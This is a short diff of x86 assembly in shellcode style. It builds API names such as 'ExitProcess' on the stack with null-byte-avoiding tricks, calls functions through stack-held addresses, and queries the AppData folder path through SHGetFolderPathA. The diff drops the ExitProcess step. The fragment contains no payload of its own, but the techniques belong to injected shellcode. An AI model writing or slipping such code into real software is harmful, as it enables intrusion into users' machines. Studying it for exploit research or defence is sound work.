@@ -77,18 +77,6 @@ call [esp + 36]
 add esp, 20
 push eax                               ; Function address on the stack
 
-xor eax, eax
-mov eax, 0x23737365
-push eax
-sub dword [esp + 3], 0x23
-push 0x636f7250
-push 0x74697845
-push esp                               ; String on the stack
-push dword [esp + 32]
-call [esp + 32]
-add esp, 12
-push eax                               ; Function address on the stack
-
 sub esp, 0xFFE                          ; Allocate memory on the stack
 push esp                                ; Buffer on the stack
 xor eax, eax                            ; EAX = 0
@@ -96,7 +84,4 @@ push eax                                ; NULL on the stack
 push 0x1d                               ; CSIDL_APPDATA
 xor eax, eax                            ; EAX = 0
 push eax                                ; NULL on the stack
-call [ESP + 20]                         ; Call SHGetFolderPathA
-xor eax, eax
-push eax
-call [ESP + 4]
+call [ESP + 16]                         ; Call SHGetFolderPathA
